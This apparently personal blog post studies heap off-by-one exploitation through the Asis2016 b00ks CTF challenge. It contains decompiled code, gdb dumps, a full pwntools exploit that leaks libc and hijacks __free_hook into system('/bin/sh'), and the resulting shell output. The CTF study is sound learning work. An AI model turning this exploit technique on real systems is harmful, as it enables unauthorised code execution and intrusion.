---
title: off-by-one学习
date: 2020-03-17 22:38:35
tags:
---
学习一下堆利用的off-by-one技术，之前嘶吼CTF有一个easypwn，当时没有弄出来，一直耿耿于怀，现在先学习一下off-by-one技术<!--more-->  
```  
本文引用了部分师傅博客的原文，侵删  
```  
## 漏洞原理  
off by one就是单字节溢出，指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。往往和边界检查不严以及字符串操作有关。  
边界检查不严：  
①使用循环语句向堆块中写入数据时，循环的次数设置错误（这在C语言初学者中很常见）导致多写入了一个字节。  
②字符串操作不合适   
一般来说，单字节溢出被认为是难以利用的，但是因为Linux的堆管理机制 ptmalloc 验证的松散性，基于 Linux 堆的 ff-by-one漏洞利用起来并不复杂，并且威力强大。 此外，需要说明的一点是 off-by-one是可以基于各种缓冲区的，比如栈、bss 段等等，我也看到过很多栈上的obo的wp，但是堆上（heap based）的off-by-one是CTF中比较常见的。我仅讨论堆上的off-by-one情况。（其实是栈上的我还不会）  
## 漏洞利用  
1.可以通过覆盖低字节来导致结构之间重叠，从而泄露其他结构的数据  
2.溢出字节为 NULL 字节：在size为0x100的时候，溢出NULL字节可以使得prev_in_use位被清，这样前块会被认为是free块。（1）这时可以选择使用unlink方法（见 unlink 部分）进行处理。（2）另外，这时prev_size域就会启用，就可以伪造prev_size ，从而造成块之间发生重叠。此方法的关键在于unlink的时候没有检查按照prev_size找到的块的后一块（理论上是当前正在 unlink 的块）与当前正在unlink的块大小是否相等。  
## 例题：Asis2016_b00ks  
检查保护  
```shell  
[*] '/home/N0vice/Desktop/BUUCTF/asis2016_b00ks/b00ks'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```  
开启了Full RELRO，got表不可写  
分析一下add函数中的结构体  
```C++  
    v3 = malloc(0x20uLL);
    if ( v3 )
    {
        *(v3 + 6) = v1;                     // description size
        *(off_202010 + v2) = v3;            // book
        *(v3 + 2) = v5;                     // description
        *(v3 + 1) = ptr;                    // name
        *v3 = ++unk_202024;                 // ID
        return 0LL;
    }
```  
add等函数名都是我自己改的  
main  
```C++  
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  struct _IO_FILE *v3; // rdi
  __int64 savedregs; // [rsp+20h] [rbp+0h]

  setvbuf(stdout, 0LL, 2, 0LL);
  v3 = stdin;
  setvbuf(stdin, 0LL, 1, 0LL);
  sub_A77(v3, 0LL);
  change_author_name();
  while ( sub_A89() != 6 )
  {
    switch ( &savedregs )
    {
      case 1u:
        add();
        break;
      case 2u:
        delete(v3);
        break;
      case 3u:
        edit();
        break;
      case 4u:
        print();
        break;
      case 5u:
        change_author_name();
        break;
      default:
        v3 = "Wrong option";
        puts("Wrong option");
        break;
    }
  }
  puts("Thanks to use our library software");
  return 0LL;
}
```  
add  
```C++  
signed __int64 add()
{
  int v1; // [rsp+0h] [rbp-20h]
  int v2; // [rsp+4h] [rbp-1Ch]
  void *v3; // [rsp+8h] [rbp-18h]
  void *ptr; // [rsp+10h] [rbp-10h]
  void *v5; // [rsp+18h] [rbp-8h]

  v1 = 0;
  printf("\nEnter book name size: ", *&v1);
  __isoc99_scanf("%d", &v1);
  if ( v1 >= 0 )
  {
    printf("Enter book name (Max 32 chars): ", &v1);
    ptr = malloc(v1);
    if ( ptr )
    {
      if ( my_read(ptr, v1 - 1) )
      {
        printf("fail to read name");
      }
      else
      {
        v1 = 0;
        printf("\nEnter book description size: ", *&v1);
        __isoc99_scanf("%d", &v1);
        if ( v1 >= 0 )
        {
          v5 = malloc(v1);
          if ( v5 )
          {
            printf("Enter book description: ", &v1);
            if ( my_read(v5, v1 - 1) )
            {
              printf("Unable to read description");
            }
            else
            {
              v2 = sub_B24();
              if ( v2 == -1 )
              {
                printf("Library is full");
              }
              else
              {
                v3 = malloc(0x20uLL);
                if ( v3 )
                {
                  *(v3 + 6) = v1;
                  *(off_202010 + v2) = v3;
                  *(v3 + 2) = v5;
                  *(v3 + 1) = ptr;
                  *v3 = ++unk_202024;
                  return 0LL;
                }
                printf("Unable to allocate book struct");
              }
            }
          }
          else
          {
            printf("Fail to allocate memory", &v1);
          }
        }
        else
        {
          printf("Malformed size", &v1);
        }
      }
    }
    else
    {
      printf("unable to allocate enough space");
    }
  }
  else
  {
    printf("Malformed size", &v1);
  }
  if ( ptr )
    free(ptr);
  if ( v5 )
    free(v5);
  if ( v3 )
    free(v3);
  return 1LL;
}
```  
delete  
```C++  
signed __int64 delete()
{
  int v1; // [rsp+8h] [rbp-8h]
  int i; // [rsp+Ch] [rbp-4h]

  i = 0;
  printf("Enter the book id you want to delete: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 > 0 )
  {
    for ( i = 0; i <= 19 && (!*(off_202010 + i) || **(off_202010 + i) != v1); ++i )
      ;
    if ( i != 20 )
    {
      free(*(*(off_202010 + i) + 8LL));
      free(*(*(off_202010 + i) + 16LL));
      free(*(off_202010 + i));
      *(off_202010 + i) = 0LL;
      return 0LL;
    }
    printf("Can't find selected book!", &v1);
  }
  else
  {
    printf("Wrong id", &v1);
  }
  return 1LL;
}
```  
edit  
```C++  
signed __int64 edit()
{
  int v1; // [rsp+8h] [rbp-8h]
  int i; // [rsp+Ch] [rbp-4h]

  printf("Enter the book id you want to edit: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 > 0 )
  {
    for ( i = 0; i <= 19 && (!*(off_202010 + i) || **(off_202010 + i) != v1); ++i )
      ;
    if ( i == 20 )
    {
      printf("Can't find selected book!", &v1);
    }
    else
    {
      printf("Enter new book description: ", &v1);
      if ( !my_read(*(*(off_202010 + i) + 16LL), *(*(off_202010 + i) + 24LL) - 1) )
        return 0LL;
      printf("Unable to read new description");
    }
  }
  else
  {
    printf("Wrong id", &v1);
  }
  return 1LL;
}
```  
print  
```C++  
int sub_D1F()
{
  __int64 v0; // rax
  signed int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i <= 19; ++i )
  {
    v0 = *(off_202010 + i);
    if ( v0 )
    {
      printf("ID: %d\n", **(off_202010 + i));
      printf("Name: %s\n", *(*(off_202010 + i) + 8LL));
      printf("Description: %s\n", *(*(off_202010 + i) + 16LL));
      LODWORD(v0) = printf("Author: %s\n", off_202018);
    }
  }
  return v0;
}
```  
change_author_name  
```C++  
signed __int64 change_author_name()
{
  printf("Enter author name: ");
  if ( !my_read(off_202018, 32) )
    return 0LL;
  printf("fail to read author_name", 32LL);
  return 1LL;
}
```  
最重要的就是这个my_read函数，在change_author_name时的长度是32，在别处read时的长度都会设置减去1，所以在author_name处存在漏洞  
my_read  
```C++  
signed __int64 __fastcall my_read(_BYTE *a1, int a2)
{
  int i; // [rsp+14h] [rbp-Ch]
  _BYTE *buf; // [rsp+18h] [rbp-8h]

  if ( a2 <= 0 )
    return 0LL;
  buf = a1;
  for ( i = 0; ; ++i )
  {
    if ( read(0, buf, 1uLL) != 1 )
      return 1LL;
    if ( *buf == 10 )
      break;
    ++buf;
    if ( i == a2 )
      break;
  }
  *buf = 0;      // 危
  return 0LL;
}
```  
（下文中的调试信息可能每个地方的地址不一样，因为我不是一次性调试的）  
通过调试可知，author_name后跟的就是book1的地址  
我们写author_name为30个a+2个b，然后gdb中find一下，就可以找到存放author的地址  
然后查看一下就可以看到book1的地址  
```shell  
gdb-peda$ x/16gx 0x55555575605c-28
0x555555756040:    0x6161616161616161                  0x6161616161616161
0x555555756050:    0x6161616161616161                  0x6262616161616161 //author name
0x555555756060:    0x0000555555757560  // book1_addr   0x0000000000000000
0x555555756070:    0x0000000000000000                  0x0000000000000000
0x555555756080:    0x0000000000000000                  0x0000000000000000
0x555555756090:    0x0000000000000000                  0x0000000000000000
0x5555557560a0:    0x0000000000000000                  0x0000000000000000
0x5555557560b0:    0x0000000000000000                  0x0000000000000000
```  
因为写入32个字节，所以第33个字节是\x00结束符写入到了book1的低字节处，那么就会将book1_addr和author_name连起来，那么打印author_name时就会顺带把book_addr也打印出来，这样就泄露了book1的地址  
再次修改author_name之后，把book1_addr的低字节覆盖成00，但是我们并不能控制0x0000555555757500这个地址处的数据  
我们看一下book1中的内容  
```shell  
gdb-peda$ x/10gx 0x0000555555757560
0x555555757560:    0x0000000000000001 // ID           0x0000555555757420 // description
0x555555757570:    0x00005555557574c0 // name         0x000000000000008c // description size
0x555555757580:    0x0000000000000000           0x0000000000020a81  // top chunk
0x555555757590:    0x0000000000000000           0x0000000000000000
0x5555557575a0:    0x0000000000000000           0x0000000000000000
```  
我们可以看到被修改完后的地址0x0000555555757500会落在book1_description区域内，那我们就可以写了  
我们在通过修改book1，在0x0000555555757500处伪造一个fake_book1，让fake_book1的name和description指向book2的description，那我们打印book1的时候，就会泄露出book2的description，  
泄露book2的description干什么呢？  
我们看一下book2  
```shell  
gdb-peda$ x/10gx 0x0000559d6fbc3190
0x559d6fbc3190:    0x0000000000000002    0x00007fb26dd49010
0x559d6fbc31a0:    0x00007fb26dd20010    0x0000000000021000
0x559d6fbc31b0:    0x0000000000000000    0x0000000000020e51
0x559d6fbc31c0:    0x0000000000000000    0x0000000000000000
0x559d6fbc31d0:    0x0000000000000000    0x0000000000000000
```  
我们会发现book2的name和description都是0x7f开头的，那么只要我们泄露出来了然后减去一个偏移，就能get到libc_base了  
最后利用__free_hook来构造payload拿shell  
我们知道在调用free函数的时候，当__free_hook内容不为NULL时，会优先执行其内容，我们进行任意写，劫持了hook，就可以劫持程序流  
整理一下思路： 
1.打印出author_name，泄露book1_addr  
2.修改author_name，将book1_addr低字节覆盖成00，使得被覆盖后的指针落在book1的description范围内  
3.创建book2，计算出book2_addr与book1_addr的距离便于寻找book2的description  
4.通过修改book1的description，在被修改后的book1处伪造一个fake_book1，布置使得fake_book1的description和name都指向book2的description  
5.打印book1，泄露libc_base  
6.修改book1，使得book2的name中存放/bin/sh的指针，book2的description中存放__free_hook的指针，然后通过修改book2的description，在__free_hook写入system的指针  
疑问：  
Q：如何在book2的name中存放/bin/sh的指针，book2的description中存放__free_hook的指针？  
A：我们让fake_book1的description指向book2的name，fake_book1的name指向book2的description，就能通过修改book1，直接一并修改book2的name和description  
  
Q：为什么book2的size要设置的很大？  
A：我们知道堆有两种拓展方式一种是brk会直接拓展原来的堆，另一种是mmap会单独映射一块内存。申请一个超大的块，来使用mmap扩展内存。因为mmap分配的内存与libc之前存在固定的偏移因此可以推算出libc的基地址。  
Q：description size存放位置的错误？  
A：没看懂，不知道，挖坑待填……  
还要提一点，就是伪造的fake_book1，要向book2的name中写入/bin/sh的指针，book2的description中写入__free_hook的指针，具体需要通过让fake_book1的description指向book2的name，fake_book1的name指向book2的description，然后edit(1)来实现，但是一开始为了泄露book2的description，将book1的description和name都设置成了book2的description.我在这里直接改了前面的构造，从前面开始就实现了fake_book1_name==>book2_description,fake_book1_description==>book2_name(==>是指向的意思)，一开始就设置成这样了好像也可以   
### exp  
```Python  
#!usr/bin/env python
#coding=utf-8
from pwn import *
context.terminal = ['terminator','-x','sh','-c']
#context.log_level="debug"
p=process("./b00ks")
elf = ELF("./b00ks")
libc = elf.libc
#p=remote("node3.buuoj.cn",25805)
def create(name_size, book_name, des_size, book_des):
    p.recv()
    p.sendline('1')
    p.sendlineafter('Enter book name size: ', str(name_size))
    p.sendlineafter('Enter book name (Max 32 chars): ', book_name)
    p.sendlineafter('Enter book description size: ', str(des_size))
    p.sendlineafter('Enter book description: ', book_des)

def delete(book_id):
    p.recv()
    p.sendline('2')
    p.sendlineafter('Enter the book id you want to delete: ', str(book_id))

def edit(book_id, book_des):
    p.recv()
    p.sendline('3')
    p.sendlineafter('Enter the book id you want to edit: ', str(book_id))
    p.sendlineafter('Enter new book description: ', book_des)

def show():
    p.recvuntil('>')
    p.sendline('4')

def change_author_name(name):
    p.recv()
    p.sendline('5')
    p.sendlineafter('Enter author name: ', name)

p.recvuntil("name: ")
p.sendline("a"*30+"b"*2)
create(140,"N0vice",140,"welcome")
show()

p.recvuntil("bb")
book1_addr=u64(p.recv(6).ljust(8, '\x00'))
log.success("book1_addr==>" + hex(book1_addr))

book2_addr = book1_addr + 0x30
book2_des = book2_addr + 0x10
create(0x21000,"nnn",0x21000,"hello")
edit(1,"a"*0x40 + p64(0x1) + p64(book2_des) + p64(book2_des-0x8) + p64(0xffff))
change_author_name("a"*30+"c"*2)

show()

address = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
print hex(address)
offset = 0x5a4010
libc_base = address - offset
system_addr = libc_base + libc.sym['system']
free_hook = libc_base + libc.sym['__free_hook']
binsh_addr = libc_base + libc.search("/bin/sh").next()
log.success("libc_base==>" + hex(libc_base))
log.success("stytem_addr==>" + hex(system_addr))
log.success("free_hook_addr==>" + hex(free_hook))
log.success("binsh_addr==>" + hex(binsh_addr))

payload = p64(binsh_addr) + p64(free_hook)
edit(1,payload)
#gdb.attach(p)
payload = p64(system_addr)
edit(2,payload)
delete(2)

p.interactive()
```  
getshell  
```shell  
N0vice@ubuntu:~/Desktop/BUUCTF/asis2016_b00ks$ python exp.py 
[+] Starting local process './b00ks': pid 5084
[*] '/home/N0vice/Desktop/BUUCTF/asis2016_b00ks/b00ks'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] u'/lib/x86_64-linux-gnu/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] book1_addr==>0x55c96b9b2160
0x7faee678b010
[+] libc_base==>0x7faee61e7000
[+] stytem_addr==>0x7faee622c390
[+] free_hook_addr==>0x7faee65ad7a8
[+] binsh_addr==>0x7faee6373d57
[*] Switching to interactive mode
$ id
uid=1000(N0vice) gid=100(users) groups=100(users)
$  
```  
参考链接：  
https://p1kk.github.io/2019/10/03/Asis%20CTF%202016%20b00ks(obo)/wp/  
https://www.jianshu.com/p/3bb7ef1f8881  
https://cq674350529.github.io/2018/06/05/asis-ctf-2016-pwn-b00ks/  
https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/  
https://blog.csdn.net/qq_41918771/article/details/101347234  